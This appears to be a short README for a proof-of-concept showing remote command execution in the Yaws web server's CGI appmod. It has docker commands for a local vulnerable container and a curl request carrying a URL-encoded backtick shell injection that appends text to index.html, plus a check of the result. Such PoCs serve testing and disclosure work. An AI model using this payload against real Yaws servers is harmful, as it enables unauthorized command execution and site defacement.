# Yaws RCE (CGI appmod)

`docker build -t vulnbe/yaws-pocs:rce-appmod-cgi -f Dockerfile .`

and/or

Run container `docker run --rm -d -i -p 127.0.0.1:8000:8080 vulnbe/yaws-pocs:rce-appmod-cgi`

```bash
curl 'http://127.0.0.1:8000/cgi-bin/%22%60export%20Z=$(pwd%7Ccut%20-c1);echo%20pawned%20completely%3E%3E..$Z%22%22index.html%60%22'
curl http://127.0.0.1:8000/index.html
```
